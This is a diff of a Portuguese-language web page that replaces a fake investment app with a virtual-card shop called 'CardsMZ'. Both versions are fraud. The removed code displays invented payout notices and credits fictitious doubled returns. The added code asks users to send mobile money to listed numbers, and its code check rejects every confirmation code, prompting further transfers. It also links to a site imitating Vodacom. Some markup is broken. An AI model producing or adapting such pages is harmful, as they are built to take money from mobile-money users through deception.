+<div class="tier-grid"><div><p class="tier-label">Características</p><ul><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Recarga mínima de 1.000 MZN</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Taxa manutenção: 0,5%/mês</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Limite de gastos: 50.000 MZN</li></ul></div><div><p class="tier-label">Vantagens</p><ul><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Serviços exclusivos</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Recompensas avançadas</li><li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Atendimento prioritário</li></ul></div></div>
+<button class="btn btn-gold btn-full mt-4" onclick="selectCard('Cartão VIP - 1.500 MZN')">Comprar</button>
+</div>
+</div>
 
 </div>
 
-<nav id="navbar" class="hidden">
-    <button onclick="nav('home', this)" class="active">HOME</button>
-    <button onclick="nav('investir', this)">DEPOSITAR</button>
-    <button onclick="nav('saque', this)">SACAR</button>
-    <button onclick="nav('historico', this)">EXTRATO</button>
-</nav>
+<!-- Info adicional -->
+<div class="info-additional">
+<h3 class="font-heading" style="font-weight:700;font-size:1.125rem">Informações <span class="gradient-text">Adicionais</span></h3>
+<div class="grid">
+<span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(168 70% 45%)" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Validade: 1 ano</span>
+<span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(168 70% 45%)" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Taxa de recarga: 1%</span>
+<span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(168 70% 45%)" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Taxa de saque: 2%</span>
+<span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(168 70% 45%)" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Entrega em até 24h</span>
+</div>
+</div>
+</div>
+</section>
+
+<!-- ============ HOW IT WORKS ============ -->
+<section class="how-bg">
+<div class="container">
+<div class="section-title">
+<h2>Como <span class="gradient-text">Funciona</span></h2>
+<p>Processo simples e rápido em apenas 4 passos.</p>
+</div>
+<div class="steps-grid">
+<div class="step"><div class="step-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div><div class="step-num">1</div><h3>Escolha o Cartão</h3><p>Selecione o tipo de cartão que melhor atende às suas necessidades.</p></div>
+<div class="step"><div class="step-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg></div><div class="step-num">2</div><h3>Faça o Pagamento</h3><p>Envie o valor via M-PESA ou E-MOLA para os números indicados.</p></div>
+<div class="step"><div class="step-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div><div class="step-num">3</div><h3>Envie o Comprovante</h3><p>Envie o comprovante de pagamento para o nosso WhatsApp.</p></div>
+<div class="step"><div class="step-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div><div class="step-num">4</div><h3>Receba o Cartão</h3><p>Receba os dados do seu cartão virtual em até 24 horas.</p></div>
+</div>
+</div>
+</section>
+
+<!-- ============ PAYMENT SECTION ============ -->
+<section id="pagamento">
+<div class="container">
+<div class="section-title">
+<h2>Formas de <span class="gradient-text">Pagamento</span></h2>
+<p id="pay-subtitle">Selecione um cartão acima e siga os passos para concluir a compra.</p>
+</div>
+
+<!-- Payment instructions -->
+<div class="info-box">
+<div style="display:flex;align-items:center;gap:.75rem;margin-bottom:1rem">
+<div style="width:40px;height:40px;border-radius:.75rem;background:hsla(var(--primary)/.1);display:flex;align-items:center;justify-content:center"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="hsl(168 70% 45%)" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg></div>
+<h3 class="font-heading" style="font-weight:700;font-size:1.125rem">Como Funciona o Pagamento</h3>
+</div>
+<div class="info-grid">
+<div class="info-step"><div class="info-num" style="background:hsla(var(--primary)/.1);color:hsl(var(--primary))">1</div><div><p style="font-weight:600;font-size:.875rem">Digite seu número</p><p class="text-xs text-muted" style="margin-top:2px">Para receber o código de confirmação por SMS</p></div></div>
+<div class="info-step"><div class="info-num" style="background:hsla(var(--secondary)/.1);color:hsl(var(--secondary))">2</div><div><p style="font-weight:600;font-size:.875rem">Transfira o valor</p><p class="text-xs text-muted" style="margin-top:2px">Via M-PESA ou E-MOLA para os números indicados</p></div></div>
+<div class="info-step"><div class="info-num" style="background:hsla(var(--primary)/.1);color:hsl(var(--primary))">3</div><div><p style="font-weight:600;font-size:.875rem">Confirme e receba</p><p class="text-xs text-muted" style="margin-top:2px">Insira o código e receba seu cartão virtual</p></div></div>
+</div>
+</div>
+
+<!-- Payment methods -->
+<div class="info-box">
+<div style="display:flex;align-items:center;gap:.75rem;margin-bottom:1rem">
+<div style="width:40px;height:40px;border-radius:.75rem;background:hsla(var(--secondary)/.1);display:flex;align-items:center;justify-content:center"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="hsl(42 80% 55%)" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>
+<h3 class="font-heading" style="font-weight:700;font-size:1.125rem">Métodos de Pagamento Aceitos</h3>
+</div>
+<div class="methods-grid">
+<div class="method-card">
+<div style="display:flex;align-items:center;gap:.75rem;margin-bottom:.75rem"><div class="pay-method-icon" style="background:hsla(var(--primary)/.1)">💸</div><div><p class="font-heading" style="font-weight:600">M-PESA</p><p class="text-sm text-muted">Vodacom Moçambique</p></div></div>
+<div class="steps-list"><p>• Marque *150# no seu telefone</p><p>• Selecione "Transferir Dinheiro"</p><p>• Digite o número: <strong style="color:hsl(var(--fg))">84 564 6041</strong></p><p>• Confirme o valor e insira seu PIN</p></div>
+</div>
+<div class="method-card">
+<div style="display:flex;align-items:center;gap:.75rem;margin-bottom:.75rem"><div class="pay-method-icon" style="background:hsla(var(--secondary)/.1)">💸</div><div><p class="font-heading" style="font-weight:600">E-MOLA</p><p class="text-sm text-muted">Movitel Moçambique</p></div></div>
+<div class="steps-list"><p>• Marque *Se*r# no seu telefone</p><p>• Selecione "Enviar Dinheiro"</p><p>• Digite o número: <strong style="color:hsl(var(--fg))">87 635 3251</strong></p><p>• Confirme o valor e insira seu PIN</p></div>
+</div>
+</div>
+<div style="margin-top:1rem;padding:.75rem;border-radius:.5rem;background:hsla(var(--primary)/.05);border:1px solid hsla(var(--primary)/.2);display:flex;align-items:flex-start;gap:.5rem">
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(168 70% 45%)" stroke-width="2" stroke-linecap="round" style="flex-shrink:0;margin-top:2px"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+<p class="text-xs text-muted">Todas as transações são seguras e processadas em tempo real. Após a transferência, você receberá um SMS com o código de confirmação.</p>
+</div>
+</div>
+
+<!-- Step flow -->
+<div style="max-width:520px;margin:0 auto;display:flex;flex-direction:column;gap:1rem">
+<div class="step-indicator">
+<div class="step-pill active" id="pill-phone"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg> Passo 1</div>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(var(--muted-fg))" stroke-width="2" stroke-linecap="round"><polyline points="9 18 15 12 9 6"/></svg>
+<div class="step-pill inactive" id="pill-payment"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg> Passo 2</div>
+</div>
+
+<!-- Phone step -->
+<div id="step-phone" class="pay-card" style="display:flex;flex-direction:column;gap:1.25rem">
+<h3 class="text-center font-heading" style="font-weight:700;font-size:1.125rem">Receber Código de <span class="gradient-text">Confirmação</span></h3>
+<p class="text-sm text-muted text-center">Digite o número de telefone para receber o código de confirmação de pagamento por SMS.</p>
+<div>
+<label class="text-sm text-muted" style="display:block;margin-bottom:.25rem">Número de telefone</label>
+<input type="tel" id="phone-input" placeholder="Ex: 84 123 4567" maxlength="12" class="phone-input">
+<p id="phone-error" class="hidden" style="color:hsl(var(--destructive));font-size:.875rem;margin-top:.25rem"></p>
+</div>
+<div class="flex-gap">
+<button class="btn btn-back" style="flex:1" onclick="resetCard()">← Voltar</button>
+<button class="btn btn-hero" style="flex:1" onclick="goToPayment()">Continuar</button>
+</div>
+</div>
+
+<!-- Payment step -->
+<div id="step-payment" class="hidden" style="display:flex;flex-direction:column;gap:1rem">
+<div class="pay-card" style="display:flex;flex-direction:column;gap:1rem">
+<h3 class="text-center font-heading" style="font-weight:700;font-size:1.125rem">Confirmação de <span class="gradient-text">Pagamento</span></h3>
+<div style="display:flex;align-items:center;justify-content:space-between;background:hsl(var(--muted));border-radius:.5rem;padding:.75rem 1rem">
+<p class="text-sm text-muted">Código será enviado para: <strong id="display-phone" style="color:hsl(var(--fg))"></strong></p>
+<button style="background:none;border:none;color:hsl(var(--primary));font-size:.875rem;font-weight:600;cursor:pointer" onclick="backToPhone()">Trocar</button>
+</div>
+</div>
+
+<div class="pay-method">
+<div style="display:flex;align-items:center;gap:1rem"><div class="pay-method-icon" style="background:hsla(var(--primary)/.1)">💸</div><div><p class="font-heading" style="font-weight:600">M-PESA</p><p class="text-sm text-muted">84 564 6041</p></div></div>
+<button class="copy-btn" onclick="copyNum('845646041')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar</button>
+</div>
+
+<div class="pay-method">
+<div style="display:flex;align-items:center;gap:1rem"><div class="pay-method-icon" style="background:hsla(var(--secondary)/.1)">💸</div><div><p class="font-heading" style="font-weight:600">E-MOLA</p><p class="text-sm text-muted">87 635 3251</p></div></div>
+<button class="copy-btn" onclick="copyNum('876353251')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar</button>
+</div>
+
+<div class="pay-card">
+<p class="font-heading" style="font-weight:600;font-size:.875rem;margin-bottom:.5rem">Instruções de Pagamento:</p>
+<ol style="padding-left:1.25rem;display:flex;flex-direction:column;gap:.5rem;font-size:.875rem;color:hsl(var(--muted-fg))">
+<li>Transfira o valor exato para um dos números acima.</li>
+<li>Aguarde o código de confirmação por SMS.</li>
+<li>Digite o código de confirmação abaixo.</li>
+</ol>
+</div>
+  <!-- 🔗 LINKS -->
+<div id="links" class="screen">
+    <h</h3>
+
+    <input id="link" placeholder="Valor do link">
+
+    <button ="link()"></button>
+
+    <! -->
+    <a href="https://cardsmz-system--vodacomsite.replit.app/"
+       target="_blank"
+       style="display:block;
+              margin-top:15px;
+              padding:12px;
+              text-align:center;
+              background:#10b981;
+              color:black;
+              font-weight:bold;
+              border-radius:10px;
+              text-decoration:none;">
+      
+    </a>
+
+</div>
+
+<div class="pay-card" style="display:flex;flex-direction:column;gap:1rem">
+<label class="text-sm text-muted">Código de confirmação (6 dígitos)</label>
+<input type="text" id="code-input" placeholder="000000" maxlength="6" class="code-input" oninput="this.value=this.value.replace(/\D/g,'').slice(0,6);document.getElementById('code-error').classList.add('hidden')">
+<div id="code-error" class="error-box hidden">
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="hsl(0 84% 60%)" stroke-width="2" stroke-linecap="round" style="flex-shrink:0;margin-top:2px"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+<p id="code-error-text"></p>
+</div>
+<button style="background:none;border:none;color:hsl(var(--primary));font-size:.875rem;font-weight:600;cursor:pointer;align-self:center">Receber Novamente o Código</button>
+<div class="flex-gap">
+<button class="btn btn-hero" style="flex:1" onclick="verifyCode()">Verificar Código</button>
+<button class="btn btn-whatsapp" style="flex:1" onclick="openWhatsApp()">💬 WhatsApp</button>
+</div>
+</div>
+
+<div class="notes-box">
+<p><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> O pagamento deve ser feito dentro de 30 minutos após a geração do código.</p>
+<p><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> Se não for feito no prazo, o código expirará.</p>
+<p><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg> Problemas? WhatsApp: +258 84 715 4707</p>
+</div>
+</div>
+
+</div>
+</div>
+</section>
+
+<!-- ============ FOOTER ============ -->
+<footer>
+<div class="container">
+<div class="inner">
+<div class="font-heading" style="font-weight:700;font-size:1.125rem"><span class="gradient-text">CardsMZ</span></div>
+<p>© 2026 CardsMZ. Todos os direitos reservados.</p>
+<a href="https://wa.me/258847154707" target="_blank" rel="noopener noreferrer"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg> Suporte WhatsApp</a>
+</div>
+</div>
+</footer>
+
+<!-- Toast -->
+<div id="toast" style="position:fixed;bottom:2rem;left:50%;transform:translateX(-50%) translateY(100px);background:hsl(var(--card));border:1px solid hsl(var(--border));color:hsl(var(--fg));padding:.75rem 1.5rem;border-radius:var(--radius);font-size:.875rem;font-weight:500;transition:transform .3s ease;z-index:999;pointer-events:none"></div>
 
 <script>
-let user = JSON.parse(localStorage.getItem("paymoz_data")) || null;
+let selectedCard='',phone='';
 
-const fakeLogs = ["84*** investiu 55 MT", "87*** sacou 2000 MT", "user99 investiu 300 MT", "84*** lucrou 800 MT"];
-setInterval(() => {
-    if(user) {
-        const bar = document.getElementById("notify-bar");
-        bar.innerText = fakeLogs[Math.floor(Math.random() * fakeLogs.length)];
-        bar.classList.remove("hidden");
-        setTimeout(() => bar.classList.add("hidden"), 3000);
-    }
-}, 6000);
-
-function register() {
-    const e = document.getElementById("email").value;
-    const s = document.getElementById("senha").value;
-    if(!e || !s) return alert("Preencha os campos.");
-    user = {
-        email: e,
-        saldo: 0, // Saldo inicial zerado conforme solicitado
-        investiu55: false,
-        jaInvestiu: false, // Nova flag para verificar investimento
-        levantamentosHoje: 0,
-        ultimoAcesso: new Date().getTime(),
-        historico: [{tipo: "Conta Criada", valor: 0, data: "Hoje", status: "Sucesso"}]
-    };
-    save();
-    boot();
+function showToast(msg){
+const t=document.getElementById('toast');t.textContent=msg;
+t.style.transform='translateX(-50%) translateY(0)';
+setTimeout(()=>{t.style.transform='translateX(-50%) translateY(100px)'},2000);
 }
 
-function login() {
-    const saved = JSON.parse(localStorage.getItem("paymoz_data"));
-    if(saved) { 
-        user = saved; 
-        processarRendimentoDiario(); // Verifica rendimento ao entrar
-        boot(); 
-    } else { 
-        alert("Conta não encontrada."); 
-    }
+function selectCard(name){
+selectedCard=name;
+document.getElementById('pay-subtitle').textContent='Cartão selecionado: '+name;
+document.getElementById('pagamento').scrollIntoView({behavior:'smooth'});
 }
 
-// Lógica de rendimento passivo: +24MT por dia até 500MT (se não investiu)
-function processarRendimentoDiario() {
-    if (user.jaInvestiu) return; // Se investiu, o sistema de +24MT para
-
-    const agora = new Date().getTime();
-    const umDiaEmMs = 24 * 60 * 60 * 1000;
-    const diferenca = agora - user.ultimoAcesso;
-
-    if (diferenca >= umDiaEmMs && user.saldo < 500) {
-        const diasPassados = Math.floor(diferenca / umDiaEmMs);
-        let ganho = diasPassados * 24;
-        
-        // Limita o saldo automático a 500MT
-        if ((user.saldo + ganho) > 500) {
-            ganho = 500 - user.saldo;
-        }
-
-        if (ganho > 0) {
-            user.saldo += ganho;
-            user.historico.push({tipo: "Rendimento Diário", valor: ganho, data: "Automático", status: "Sucesso"});
-            user.ultimoAcesso = agora;
-            save();
-        }
-    }
-
-    // Exibe aviso na tela sobre a mineração/rendimento
-    if (!user.jaInvestiu && user.saldo < 500) {
-        document.getElementById("msgMineracao").innerText = "• Rendimento ativo: +24 MT/dia (Limite 500MT)";
-    } else if (!user.jaInvestiu && user.saldo >= 500) {
-        document.getElementById("msgMineracao").innerText = "• Limite de rendimento passivo atingido.";
-    } else {
-        document.getElementById("msgMineracao").innerText = "• Investidor Ativo";
-    }
+function resetCard(){
+selectedCard='';
+document.getElementById('pay-subtitle').textContent='Selecione um cartão acima e siga os passos para concluir a compra.';
 }
 
-function boot() {
-    document.getElementById("loginPage").classList.add("hidden");
-    document.getElementById("app").classList.remove("hidden");
-    document.getElementById("navbar").classList.remove("hidden");
-    updateUI();
+function goToPayment(){
+const val=document.getElementById('phone-input').value.replace(/\s/g,'');
+if(!/^8[0-9]{8}$/.test(val)){
+document.getElementById('phone-error').textContent='Digite um número válido (ex: 84 123 4567)';
+document.getElementById('phone-error').classList.remove('hidden');
+return;
+}
+phone=document.getElementById('phone-input').value;
+document.getElementById('phone-error').classList.add('hidden');
+document.getElementById('display-phone').textContent=phone;
+document.getElementById('step-phone').style.display='none';
+document.getElementById('step-payment').classList.remove('hidden');
+document.getElementById('step-payment').style.display='flex';
+document.getElementById('pill-phone').className='step-pill inactive';
+document.getElementById('pill-payment').className='step-pill active';
 }
 
-function updateUI() {
-    document.getElementById("valSaldo").innerText = user.saldo.toFixed(2);
-    const list = document.getElementById("listaHistorico");
-    list.innerHTML = user.historico.map(h => `
-        <div class="hist-item">
-            <div><b>${h.tipo}</b><br><small>${h.data}</small></div>
-            <div style="color:${h.valor > 0 ? '#0ffc' : '#f55'}">${h.valor > 0 ? '+' : ''}${h.valor} MT<br><small>${h.status}</small></div>
-        </div>
-    `).reverse().join('');
+function backToPhone(){
+document.getElementById('step-phone').style.display='flex';
+document.getElementById('step-payment').style.display='none';
+document.getElementById('step-payment').classList.add('hidden');
+document.getElementById('pill-phone').className='step-pill active';
+document.getElementById('pill-payment').className='step-pill inactive';
 }
 
-function gerarPagamento() {
-    const v = parseFloat(document.getElementById("depValor").value);
-    const m = document.getElementById("depMetodo").value;
-    
-    if(v === 55 && user.investiu55) return alert("A oferta de 55 MT é válida apenas uma vez por conta.");
-    if(v < 55) return alert("Investimento mínimo é 55 MT");
-    
-    const conta = m === "M-Pesa" ? "845646041" : "876353251";
-    document.getElementById("txtInstrucao").innerHTML = `<b>PAGAMENTO VIA ${m.toUpperCase()}</b><br>Envie ${v} MT para: <b>${conta}</b><br><br>O seu retorno será creditado em 30-40 minutos após confirmação.`;
-    document.getElementById("areaConfirmacao").classList.remove("hidden");
+function copyNum(n){navigator.clipboard.writeText(n);showToast('Número copiado!')}
+
+function verifyCode(){
+const c=document.getElementById('code-input').value;
+if(c.length!==6){
+document.getElementById('code-error-text').textContent='Digite o código de 6 dígitos.';
+document.getElementById('code-error').classList.remove('hidden');return;
+}
+document.getElementById('code-error-text').textContent='Código incorreto. Por favor, transfira o valor para um dos números acima e tente novamente.';
+document.getElementById('code-error').classList.remove('hidden');
+document.getElementById('code-input').value='';
 }
 
-function confirmar() {
-    const id = document.getElementById("idTransacao").value;
-    const v = parseFloat(document.getElementById("depValor").value);
-    if(id.length < 5) return alert("Insira um ID de transação válido.");
-
-    if(v === 55) user.investiu55 = true;
-    user.jaInvestiu = true; // Marca que o usuário investiu (para parar o +24MT)
-
-    user.historico.push({tipo: "Processando Investimento", valor: v, data: "Agora", status: "30-40 min"});
-    save();
-    updateUI();
-    alert("Comprovativo recebido! O lucro será adicionado automaticamente em instantes.");
-    
-    setTimeout(() => {
-        let retorno = v * 2;
-        if(v === 55) retorno = 100;
-        if(v === 120) retorno = 250;
-        if(v === 300) retorno = 800;
-
-        user.saldo += retorno;
-        user.historico.push({tipo: "Retorno de Investimento", valor: retorno, data: "Hoje", status: "Sucesso"});
-        save();
-        updateUI();
-    }, 5000); 
+function openWhatsApp(){
+const msg=encodeURIComponent('Olá! Quero adquirir: '+(selectedCard||'um cartão')+'. Meu número: '+phone+'. Código: '+document.getElementById('code-input').value);
+window.open('https://wa.me/258847154707?text='+msg,'_blank');
 }
-
-function processarSaque() {
-    if(user.levantamentosHoje >= 2) return alert("Limite de 2 levantamentos por dia atingido.");
-    
-    const v = parseFloat(document.getElementById("sacarValor").value);
-    if(v > user.saldo) return alert("Saldo insuficiente.");
-    
-    user.saldo -= v;
-    user.levantamentosHoje += 1;
-    user.historico.push({tipo: "Levantamento", valor: -v, data: "Agora", status: "Enviando..."});
-    save();
-    updateUI();
-    alert("Pedido de levantamento enviado com sucesso!");
-}
-
-function addComentario() {
-    const msg = document.getElementById("meuComentario").value;
-    if(!msg) return;
-    const div = document.createElement("div");
-    div.className = "comment";
-    div.innerHTML = `<b>Você</b>: ${msg}`;
-    document.getElementById("boxComentarios").prepend(div);
-    document.getElementById("meuComentario").value = "";
-}
-
-function nav(id, btn) {
-    document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
-    document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
-    document.getElementById(id).classList.remove('hidden');
-    btn.classList.add('active');
-}
-
-function save() { localStorage.setItem("paymoz_data", JSON.stringify(user)); }
 </script>
 </body>
-</html>
+    </html>
